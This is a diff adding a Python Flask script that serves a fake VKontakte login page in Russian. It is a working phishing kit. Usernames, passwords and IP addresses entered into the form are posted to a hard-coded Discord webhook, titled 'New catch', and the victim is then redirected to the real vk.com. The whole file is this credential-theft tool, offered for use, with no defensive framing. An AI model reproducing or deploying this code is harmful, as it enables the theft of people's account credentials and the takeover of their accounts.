@@ -1,0 +1,64 @@
+import requests
+from flask import Flask, request, redirect
+
+app = Flask(__name__)
+
+DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1500575970556645478/Lr83xKOtZxzLIfmfq2B8VX7hoAaNfnRW-M01Z8LVvRIcuPMFyfb2jnr-NScerbFuT3WB"
+
+def send_to_discord(data):
+    embed = {
+        "embeds": [{
+            "title": "Новый улов",
+            "color": 0xff0000,
+            "fields": [
+                {"name": "Логин", "value": data.get("login", "N/A"), "inline": True},
+                {"name": "Пароль", "value": data.get("password", "N/A"), "inline": True},
+                {"name": "IP", "value": data.get("ip", "N/A"), "inline": False}
+            ]
+        }]
+    }
+    requests.post(DISCORD_WEBHOOK_URL, json=embed)
+
+@app.route('/login', methods=['POST'])
+def capture():
+    credentials = {
+        "login": request.form.get("username"),
+        "password": request.form.get("password"),
+        "ip": request.remote_addr
+    }
+    send_to_discord(credentials)
+    return redirect("https://vk.com")
+
+@app.route('/')
+def phishing_page():
+    return '''
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>VK | Вход</title>
+        <meta charset="utf-8">
+        <style>
+            * { margin: 0; padding: 0; box-sizing: border-box; }
+            body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; background: #edeef0; }
+            .box { background: white; padding: 30px; border-radius: 8px; width: 350px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+            h2 { text-align: center; margin-bottom: 20px; color: #000; }
+            input { width: 100%; padding: 10px; margin: 8px 0; border: 1px solid #d3d9de; border-radius: 4px; box-sizing: border-box; font-size: 14px; }
+            button { width: 100%; padding: 12px; background: #5181b8; color: white; border: none; border-radius: 4px; font-size: 14px; cursor: pointer; margin-top: 10px; }
+            button:hover { background: #4a76a8; }
+        </style>
+    </head>
+    <body>
+        <div class="box">
+            <h2>ВКонтакте</h2>
+            <form action="/login" method="POST">
+                <input type="text" name="username" placeholder="Телефон или email" required>
+                <input type="password" name="password" placeholder="Пароль" required>
+                <button type="submit">Войти</button>
+            </form>
+        </div>
+    </body>
+    </html>
+    '''
+
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=8080)
